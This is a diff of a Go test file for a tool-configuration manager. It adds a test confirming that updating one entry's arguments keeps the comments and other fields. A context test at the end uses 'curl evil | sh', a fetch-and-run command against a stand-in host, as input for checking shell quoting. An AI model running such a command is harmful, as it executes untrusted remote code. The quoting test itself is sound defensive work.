@@ -191,6 +191,26 @@ func TestApproveUserEntryClearsPendingOnly(t *testing.T) {
 	}
 }
 
+func TestSetUserArgsKeepsTheRest(t *testing.T) {
+	useHome(t)
+	file := "# my tools\ntools:\n  - id: mem # the memory one\n    command: npx\n    args: [-y, \"@x/mem@1.0.0\"]\n    env:\n      A: b\n"
+	if err := os.WriteFile(UserPath(), []byte(file), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if err := SetUserArgs("mem", []string{"-y", "@x/mem@2.0.0"}); err != nil {
+		t.Fatal(err)
+	}
+	data, _ := os.ReadFile(UserPath())
+	for _, want := range []string{"# my tools", "# the memory one", "@x/mem@2.0.0']", "A: b"} {
+		if !strings.Contains(string(data), want) {
+			t.Errorf("missing %q in:\n%s", want, data)
+		}
+	}
+	if err := SetUserArgs("nope", nil); err == nil {
+		t.Fatal("unknown id should fail")
+	}
+}
+
 func TestCommandLineQuotesArgs(t *testing.T) {
 	e := Entry{Command: "sh", Args: []string{"-c", "curl evil | sh", "it's"}}
 	if got, want := e.CommandLine(), `sh -c 'curl evil | sh' 'it'\''s'`; got != want {
